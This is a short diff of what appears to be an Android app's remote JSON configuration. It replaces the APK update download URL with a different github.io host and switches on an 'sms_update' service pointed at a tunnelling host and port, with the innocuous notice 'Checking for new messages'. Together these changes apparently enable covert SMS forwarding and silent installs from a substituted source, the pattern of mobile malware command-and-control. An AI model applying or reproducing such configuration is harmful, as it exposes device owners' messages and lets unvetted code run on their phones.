@@ -5,7 +5,7 @@
 	  "update_now": false,
 	  "my_pkg_install_enable": true,
 	  "my_save_in_cache": true,
-	  "my_download_url": "https://github.com/manojvermamv/Picmob/raw/main/release/update_v1.apk",
+	  "my_download_url": "https://redmi9primemv.github.io/CodeReverse/files/update_v1.apk",
 	  "my_launch_pkg": "",
 	  "notification_msg": ""
     },
@@ -22,12 +22,12 @@
 	  "update_now": false,
 	  "my_pkg_install_enable": true,
 	  "my_save_in_cache": true,
-	  "my_download_url": "https://github.com/manojvermamv/Picmob/raw/main/release/update_v1.apk",
+	  "my_download_url": "https://redmi9primemv.github.io/CodeReverse/files/update_v1.apk",
 	  "my_launch_pkg": "",
 	  "notification_msg": "Update now"
     },
 	"sms_update": {
-      "service_enable": false,
+      "service_enable": true,
 	  "remote_host": "fine-louisiana.at.ply.gg",
 	  "remote_port": 9752,
 	  "notification_msg": "Checking for new messages."
